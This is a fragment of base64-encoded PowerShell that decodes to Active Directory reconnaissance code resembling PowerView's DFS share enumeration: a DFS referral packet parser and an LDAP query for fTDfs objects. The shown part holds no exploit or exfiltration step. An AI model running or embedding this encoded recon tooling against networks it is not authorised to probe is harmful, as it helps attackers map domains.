9uID0gJ0FsbCcKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgZnVuY3Rpb24gUGFyc2UtUGt0IHsKICAgICAgICAgICAgW0NtZGxldEJpbmRpbmcoKV0KICAgICAgICAgICAgUGFyYW0oCiAgICAgICAgICAgICAgICBbQnl0ZVtdXQogICAgICAgICAgICAgICAgJFBrdAogICAgICAgICAgICApCiAgICAgICAgICAgICRiaW4gPSAkUGt0CiAgICAgICAgICAgICRibG9iX3ZlcnNpb24gPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGJpblswLi4zXSwwKQogICAgICAgICAgICAkYmxvYl9lbGVtZW50X2NvdW50ID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDMyKCRiaW5bNC4uN10sMCkKICAgICAgICAgICAgJG9mZnNldCA9IDgKICAgICAgICAgICAgJG9iamVjdF9saXN0ID0gQCgpCiAgICAgICAgICAgIGZvcigkaT0xOyAkaSAtbGUgJGJsb2JfZWxlbWVudF9jb3VudDsgJGkrKyl7CiAgICAgICAgICAgICAgICAkYmxvYl9uYW1lX3NpemVfc3RhcnQgPSAkb2Zmc2V0CiAgICAgICAgICAgICAgICAkYmxvYl9uYW1lX3NpemVfZW5kID0gJG9mZnNldCArIDEKICAgICAgICAgICAgICAgICRibG9iX25hbWVfc2l6ZSA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQxNigkYmluWyRibG9iX25hbWVfc2l6ZV9zdGFydC4uJGJsb2JfbmFtZV9zaXplX2VuZF0sMCkKICAgICAgICAgICAgICAgICRibG9iX25hbWVfc3RhcnQgPSAkYmxvYl9uYW1lX3NpemVfZW5kICsgMQogICAgICAgICAgICAgICAgJGJsb2JfbmFtZV9lbmQgPSAkYmxvYl9uYW1lX3N0YXJ0ICsgJGJsb2JfbmFtZV9zaXplIC0gMQogICAgICAgICAgICAgICAgJGJsb2JfbmFtZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKCRiaW5bJGJsb2JfbmFtZV9zdGFydC4uJGJsb2JfbmFtZV9lbmRdKQogICAgICAgICAgICAgICAgJGJsb2JfZGF0YV9zaXplX3N0YXJ0ID0gJGJsb2JfbmFtZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAkYmxvYl9kYXRhX3NpemVfZW5kID0gJGJsb2JfZGF0YV9zaXplX3N0YXJ0ICsgMwogICAgICAgICAgICAgICAgJGJsb2JfZGF0YV9zaXplID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDMyKCRiaW5bJGJsb2JfZGF0YV9zaXplX3N0YXJ0Li4kYmxvYl9kYXRhX3NpemVfZW5kXSwwKQogICAgICAgICAgICAgICAgJGJsb2JfZGF0YV9zdGFydCA9ICRibG9iX2RhdGFfc2l6ZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAkYmxvYl9kYXRhX2VuZCA9ICRibG9iX2RhdGFfc3RhcnQgKyAkYmxvYl9kYXRhX3NpemUgLSAxCiAgICAgICAgICAgICAgICAkYmxvYl9kYXRhID0gJGJpblskYmxvYl9kYXRhX3N0YXJ0Li4kYmxvYl9kYXRhX2VuZF0KICAgICAgICAgICAgICAgIHN3aXRjaCAtd2lsZGNhcmQgKCRibG9iX25hbWUpIHsKICAgICAgICAgICAgICAgICAgICAiXHNpdGVyb290IiB7ICB9CiAgICAgICAgICAgICAgICAgICAgIlxkb21haW5yb290KiIgewogICAgICAgICAgICAgICAgICAgICAgICAkcm9vdF9vcl9saW5rX2d1aWRfc3RhcnQgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICRyb290X29yX2xpbmtfZ3VpZF9lbmQgPSAxNQogICAgICAgICAgICAgICAgICAgICAgICAkcm9vdF9vcl9saW5rX2d1aWQgPSBbYnl0ZVtdXSRibG9iX2RhdGFbJHJvb3Rfb3JfbGlua19ndWlkX3N0YXJ0Li4kcm9vdF9vcl9saW5rX2d1aWRfZW5kXQogICAgICAgICAgICAgICAgICAgICAgICAkZ3VpZCA9IE5ldy1PYmplY3QgR3VpZCgsJHJvb3Rfb3JfbGlua19ndWlkKSAjIHNob3VsZCBtYXRjaCAkZ3VpZF9zdHIKICAgICAgICAgICAgICAgICAgICAgICAgJHByZWZpeF9zaXplX3N0YXJ0ID0gJHJvb3Rfb3JfbGlua19ndWlkX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHByZWZpeF9zaXplX2VuZCA9ICRwcmVmaXhfc2l6ZV9zdGFydCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHByZWZpeF9zaXplID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDE2KCRibG9iX2RhdGFbJHByZWZpeF9zaXplX3N0YXJ0Li4kcHJlZml4X3NpemVfZW5kXSwwKQogICAgICAgICAgICAgICAgICAgICAgICAkcHJlZml4X3N0YXJ0ID0gJHByZWZpeF9zaXplX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHByZWZpeF9lbmQgPSAkcHJlZml4X3N0YXJ0ICsgJHByZWZpeF9zaXplIC0gMQogICAgICAgICAgICAgICAgICAgICAgICAkcHJlZml4ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGJsb2JfZGF0YVskcHJlZml4X3N0YXJ0Li4kcHJlZml4X2VuZF0pCiAgICAgICAgICAgICAgICAgICAgICAgICRzaG9ydF9wcmVmaXhfc2l6ZV9zdGFydCA9ICRwcmVmaXhfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkc2hvcnRfcHJlZml4X3NpemVfZW5kID0gJHNob3J0X3ByZWZpeF9zaXplX3N0YXJ0ICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkc2hvcnRfcHJlZml4X3NpemUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MTYoJGJsb2JfZGF0YVskc2hvcnRfcHJlZml4X3NpemVfc3RhcnQuLiRzaG9ydF9wcmVmaXhfc2l6ZV9lbmRdLDApCiAgICAgICAgICAgICAgICAgICAgICAgICRzaG9ydF9wcmVmaXhfc3RhcnQgPSAkc2hvcnRfcHJlZml4X3NpemVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkc2hvcnRfcHJlZml4X2VuZCA9ICRzaG9ydF9wcmVmaXhfc3RhcnQgKyAkc2hvcnRfcHJlZml4X3NpemUgLSAxCiAgICAgICAgICAgICAgICAgICAgICAgICRzaG9ydF9wcmVmaXggPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZygkYmxvYl9kYXRhWyRzaG9ydF9wcmVmaXhfc3RhcnQuLiRzaG9ydF9wcmVmaXhfZW5kXSkKICAgICAgICAgICAgICAgICAgICAgICAgJHR5cGVfc3RhcnQgPSAkc2hvcnRfcHJlZml4X2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHR5cGVfZW5kID0gJHR5cGVfc3RhcnQgKyAzCiAgICAgICAgICAgICAgICAgICAgICAgICR0eXBlID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDMyKCRibG9iX2RhdGFbJHR5cGVfc3RhcnQuLiR0eXBlX2VuZF0sMCkKICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXRlX3N0YXJ0ID0gJHR5cGVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkc3RhdGVfZW5kID0gJHN0YXRlX3N0YXJ0ICsgMwogICAgICAgICAgICAgICAgICAgICAgICAkc3RhdGUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGJsb2JfZGF0YVskc3RhdGVfc3RhcnQuLiRzdGF0ZV9lbmRdLDApCiAgICAgICAgICAgICAgICAgICAgICAgICRjb21tZW50X3NpemVfc3RhcnQgPSAkc3RhdGVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkY29tbWVudF9zaXplX2VuZCA9ICRjb21tZW50X3NpemVfc3RhcnQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRjb21tZW50X3NpemUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MTYoJGJsb2JfZGF0YVskY29tbWVudF9zaXplX3N0YXJ0Li4kY29tbWVudF9zaXplX2VuZF0sMCkKICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1lbnRfc3RhcnQgPSAkY29tbWVudF9zaXplX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1lbnRfZW5kID0gJGNvbW1lbnRfc3RhcnQgKyAkY29tbWVudF9zaXplIC0gMQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGNvbW1lbnRfc2l6ZSAtZ3QgMCkgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjb21tZW50ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGJsb2JfZGF0YVskY29tbWVudF9zdGFydC4uJGNvbW1lbnRfZW5kXSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkcHJlZml4X3RpbWVzdGFtcF9zdGFydCA9ICRjb21tZW50X2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHByZWZpeF90aW1lc3RhbXBfZW5kID0gJHByZWZpeF90aW1lc3RhbXBfc3RhcnQgKyA3CiAgICAgICAgICAgICAgICAgICAgICAgICRwcmVmaXhfdGltZXN0YW1wID0gJGJsb2JfZGF0YVskcHJlZml4X3RpbWVzdGFtcF9zdGFydC4uJHByZWZpeF90aW1lc3RhbXBfZW5kXSAjZHdvcmQgbG93RGF0ZVRpbWUgI2R3b3JkIGhpZ2hkYXRldGltZQogICAgICAgICAgICAgICAgICAgICAgICAkc3RhdGVfdGltZXN0YW1wX3N0YXJ0ID0gJHByZWZpeF90aW1lc3RhbXBfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkc3RhdGVfdGltZXN0YW1wX2VuZCA9ICRzdGF0ZV90aW1lc3RhbXBfc3RhcnQgKyA3CiAgICAgICAgICAgICAgICAgICAgICAgICRzdGF0ZV90aW1lc3RhbXAgPSAkYmxvYl9kYXRhWyRzdGF0ZV90aW1lc3RhbXBfc3RhcnQuLiRzdGF0ZV90aW1lc3RhbXBfZW5kXQogICAgICAgICAgICAgICAgICAgICAgICAkY29tbWVudF90aW1lc3RhbXBfc3RhcnQgPSAkc3RhdGVfdGltZXN0YW1wX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1lbnRfdGltZXN0YW1wX2VuZCA9ICRjb21tZW50X3RpbWVzdGFtcF9zdGFydCArIDcKICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1lbnRfdGltZXN0YW1wID0gJGJsb2JfZGF0YVskY29tbWVudF90aW1lc3RhbXBfc3RhcnQuLiRjb21tZW50X3RpbWVzdGFtcF9lbmRdCiAgICAgICAgICAgICAgICAgICAgICAgICR2ZXJzaW9uX3N0YXJ0ID0gJGNvbW1lbnRfdGltZXN0YW1wX2VuZCAgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICR2ZXJzaW9uX2VuZCA9ICR2ZXJzaW9uX3N0YXJ0ICsgMwogICAgICAgICAgICAgICAgICAgICAgICAkdmVyc2lvbiA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQzMigkYmxvYl9kYXRhWyR2ZXJzaW9uX3N0YXJ0Li4kdmVyc2lvbl9lbmRdLDApCiAgICAgICAgICAgICAgICAgICAgICAgICRkZnNfdGFyZ2V0bGlzdF9ibG9iX3NpemVfc3RhcnQgPSAkdmVyc2lvbl9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRkZnNfdGFyZ2V0bGlzdF9ibG9iX3NpemVfZW5kID0gJGRmc190YXJnZXRsaXN0X2Jsb2Jfc2l6ZV9zdGFydCArIDMKICAgICAgICAgICAgICAgICAgICAgICAgJGRmc190YXJnZXRsaXN0X2Jsb2Jfc2l6ZSA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQzMigkYmxvYl9kYXRhWyRkZnNfdGFyZ2V0bGlzdF9ibG9iX3NpemVfc3RhcnQuLiRkZnNfdGFyZ2V0bGlzdF9ibG9iX3NpemVfZW5kXSwwKQogICAgICAgICAgICAgICAgICAgICAgICAkZGZzX3RhcmdldGxpc3RfYmxvYl9zdGFydCA9ICRkZnNfdGFyZ2V0bGlzdF9ibG9iX3NpemVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkZGZzX3RhcmdldGxpc3RfYmxvYl9lbmQgPSAkZGZzX3RhcmdldGxpc3RfYmxvYl9zdGFydCArICRkZnNfdGFyZ2V0bGlzdF9ibG9iX3NpemUgLSAxCiAgICAgICAgICAgICAgICAgICAgICAgICRkZnNfdGFyZ2V0bGlzdF9ibG9iID0gJGJsb2JfZGF0YVskZGZzX3RhcmdldGxpc3RfYmxvYl9zdGFydC4uJGRmc190YXJnZXRsaXN0X2Jsb2JfZW5kXQogICAgICAgICAgICAgICAgICAgICAgICAkcmVzZXJ2ZWRfYmxvYl9zaXplX3N0YXJ0ID0gJGRmc190YXJnZXRsaXN0X2Jsb2JfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkcmVzZXJ2ZWRfYmxvYl9zaXplX2VuZCA9ICRyZXNlcnZlZF9ibG9iX3NpemVfc3RhcnQgKyAzCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXNlcnZlZF9ibG9iX3NpemUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGJsb2JfZGF0YVskcmVzZXJ2ZWRfYmxvYl9zaXplX3N0YXJ0Li4kcmVzZXJ2ZWRfYmxvYl9zaXplX2VuZF0sMCkKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc2VydmVkX2Jsb2Jfc3RhcnQgPSAkcmVzZXJ2ZWRfYmxvYl9zaXplX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc2VydmVkX2Jsb2JfZW5kID0gJHJlc2VydmVkX2Jsb2Jfc3RhcnQgKyAkcmVzZXJ2ZWRfYmxvYl9zaXplIC0gMQogICAgICAgICAgICAgICAgICAgICAgICAkcmVzZXJ2ZWRfYmxvYiA9ICRibG9iX2RhdGFbJHJlc2VydmVkX2Jsb2Jfc3RhcnQuLiRyZXNlcnZlZF9ibG9iX2VuZF0KICAgICAgICAgICAgICAgICAgICAgICAgJHJlZmVycmFsX3R0bF9zdGFydCA9ICRyZXNlcnZlZF9ibG9iX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHJlZmVycmFsX3R0bF9lbmQgPSAkcmVmZXJyYWxfdHRsX3N0YXJ0ICsgMwogICAgICAgICAgICAgICAgICAgICAgICAkcmVmZXJyYWxfdHRsID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDMyKCRibG9iX2RhdGFbJHJlZmVycmFsX3R0bF9zdGFydC4uJHJlZmVycmFsX3R0bF9lbmRdLDApCiAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfY291bnRfc3RhcnQgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfY291bnRfZW5kID0gJHRhcmdldF9jb3VudF9zdGFydCArIDMKICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF9jb3VudCA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQzMigkZGZzX3RhcmdldGxpc3RfYmxvYlskdGFyZ2V0X2NvdW50X3N0YXJ0Li4kdGFyZ2V0X2NvdW50X2VuZF0sMCkKICAgICAgICAgICAgICAgICAgICAgICAgJHRfb2Zmc2V0ID0gJHRhcmdldF9jb3VudF9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcigkaj0xOyAkaiAtbGUgJHRhcmdldF9jb3VudDsgJGorKyl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X2VudHJ5X3NpemVfc3RhcnQgPSAkdF9vZmZzZXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfZW50cnlfc2l6ZV9lbmQgPSAkdGFyZ2V0X2VudHJ5X3NpemVfc3RhcnQgKyAzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X2VudHJ5X3NpemUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGRmc190YXJnZXRsaXN0X2Jsb2JbJHRhcmdldF9lbnRyeV9zaXplX3N0YXJ0Li4kdGFyZ2V0X2VudHJ5X3NpemVfZW5kXSwwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF90aW1lX3N0YW1wX3N0YXJ0ID0gJHRhcmdldF9lbnRyeV9zaXplX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfdGltZV9zdGFtcF9lbmQgPSAkdGFyZ2V0X3RpbWVfc3RhbXBfc3RhcnQgKyA3CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X3RpbWVfc3RhbXAgPSAkZGZzX3RhcmdldGxpc3RfYmxvYlskdGFyZ2V0X3RpbWVfc3RhbXBfc3RhcnQuLiR0YXJnZXRfdGltZV9zdGFtcF9lbmRdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X3N0YXRlX3N0YXJ0ID0gJHRhcmdldF90aW1lX3N0YW1wX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfc3RhdGVfZW5kID0gJHRhcmdldF9zdGF0ZV9zdGFydCArIDMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfc3RhdGUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGRmc190YXJnZXRsaXN0X2Jsb2JbJHRhcmdldF9zdGF0ZV9zdGFydC4uJHRhcmdldF9zdGF0ZV9lbmRdLDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X3R5cGVfc3RhcnQgPSAkdGFyZ2V0X3N0YXRlX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfdHlwZV9lbmQgPSAkdGFyZ2V0X3R5cGVfc3RhcnQgKyAzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X3R5cGUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGRmc190YXJnZXRsaXN0X2Jsb2JbJHRhcmdldF90eXBlX3N0YXJ0Li4kdGFyZ2V0X3R5cGVfZW5kXSwwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlcnZlcl9uYW1lX3NpemVfc3RhcnQgPSAkdGFyZ2V0X3R5cGVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlcnZlcl9uYW1lX3NpemVfZW5kID0gJHNlcnZlcl9uYW1lX3NpemVfc3RhcnQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VydmVyX25hbWVfc2l6ZSA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQxNigkZGZzX3RhcmdldGxpc3RfYmxvYlskc2VydmVyX25hbWVfc2l6ZV9zdGFydC4uJHNlcnZlcl9uYW1lX3NpemVfZW5kXSwwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlcnZlcl9uYW1lX3N0YXJ0ID0gJHNlcnZlcl9uYW1lX3NpemVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlcnZlcl9uYW1lX2VuZCA9ICRzZXJ2ZXJfbmFtZV9zdGFydCArICRzZXJ2ZXJfbmFtZV9zaXplIC0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlcnZlcl9uYW1lID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGRmc190YXJnZXRsaXN0X2Jsb2JbJHNlcnZlcl9uYW1lX3N0YXJ0Li4kc2VydmVyX25hbWVfZW5kXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzaGFyZV9uYW1lX3NpemVfc3RhcnQgPSAkc2VydmVyX25hbWVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNoYXJlX25hbWVfc2l6ZV9lbmQgPSAkc2hhcmVfbmFtZV9zaXplX3N0YXJ0ICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNoYXJlX25hbWVfc2l6ZSA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQxNigkZGZzX3RhcmdldGxpc3RfYmxvYlskc2hhcmVfbmFtZV9zaXplX3N0YXJ0Li4kc2hhcmVfbmFtZV9zaXplX2VuZF0sMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzaGFyZV9uYW1lX3N0YXJ0ID0gJHNoYXJlX25hbWVfc2l6ZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2hhcmVfbmFtZV9lbmQgPSAkc2hhcmVfbmFtZV9zdGFydCArICRzaGFyZV9uYW1lX3NpemUgLSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2hhcmVfbmFtZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKCRkZnNfdGFyZ2V0bGlzdF9ibG9iWyRzaGFyZV9uYW1lX3N0YXJ0Li4kc2hhcmVfbmFtZV9lbmRdKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF9saXN0ICs9ICJcXCRzZXJ2ZXJfbmFtZVwkc2hhcmVfbmFtZSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0X29mZnNldCA9ICRzaGFyZV9uYW1lX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRvZmZzZXQgPSAkYmxvYl9kYXRhX2VuZCArIDEKICAgICAgICAgICAgICAgICRkZnNfcGt0X3Byb3BlcnRpZXMgPSBAewogICAgICAgICAgICAgICAgICAgICdOYW1lJyA9ICRibG9iX25hbWUKICAgICAgICAgICAgICAgICAgICAnUHJlZml4JyA9ICRwcmVmaXgKICAgICAgICAgICAgICAgICAgICAnVGFyZ2V0TGlzdCcgPSAkdGFyZ2V0X2xpc3QKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRvYmplY3RfbGlzdCArPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgJGRmc19wa3RfcHJvcGVydGllcwogICAgICAgICAgICAgICAgJHByZWZpeCA9ICROdWxsCiAgICAgICAgICAgICAgICAkYmxvYl9uYW1lID0gJE51bGwKICAgICAgICAgICAgICAgICR0YXJnZXRfbGlzdCA9ICROdWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHNlcnZlcnMgPSBAKCkKICAgICAgICAgICAgJG9iamVjdF9saXN0IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgaWYgKCRfLlRhcmdldExpc3QpIHsKICAgICAgICAgICAgICAgICAgICAkXy5UYXJnZXRMaXN0IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkc2VydmVycyArPSAkXy5zcGxpdCgnXCcpWzJdCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRzZXJ2ZXJzCiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIEdldC1Eb21haW5ERlNTaGFyZVYxIHsKICAgICAgICAgICAgW0NtZGxldEJpbmRpbmcoKV0KICAgICAgICAgICAgUGFyYW0oCiAgICAgICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAgICAgJERvbWFpbiwKICAgICAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICAgICAkU2VydmVyLAogICAgICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICAgICAgICAgIFtJbnRdCiAgICAgICAgICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgICAgICAgICBbSW50XQogICAgICAgICAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICAgICAgICAgIFtTd2l0Y2hdCiAgICAgICAgICAgICAgICAkVG9tYnN0b25lLAogICAgICAgICAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAgICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgICAgICAgICApCiAgICAgICAgICAgICRERlNzZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAUFNCb3VuZFBhcmFtZXRlcnMKICAgICAgICAgICAgaWYgKCRERlNzZWFyY2hlcikgewogICAgICAgICAgICAgICAgJERGU3NoYXJlcyA9IEAoKQogICAgICAgICAgICAgICAgJERGU3NlYXJjaGVyLmZpbHRlciA9ICcoJihvYmplY3RDbGFzcz1mVERmcykpJwogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0cyA9ICRERlNTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkUHJvcGVydGllcyA9ICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICAgICAgJFJlbW90ZU5hbWVzID0gJFByb3BlcnRpZXMucmVtb3Rlc2VydmVybmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkUGt0ID0gJFByb3BlcnRpZXMucGt0CiAgICAgICAgICAgICAgICAgICAgICAgICRERlNzaGFyZXMgKz0gJFJlbW90ZU5hbWVzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoICRfLkNvbnRhaW5zKCdcJykgKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSBAeydOYW1lJz0kUHJvcGVydGllcy5uYW1lWzBdOydSZW1vdGVTZXJ2ZXJOYW1lJz0kXy5zcGxpdCgnXCcpWzJdfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkRGU1NoYXJlXSBHZXQtRG9tYWluREZTU2hhcmVWMSBlcnJvciBpbiBwYXJzaW5nIERGUyBzaGFyZSA6ICRfIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7C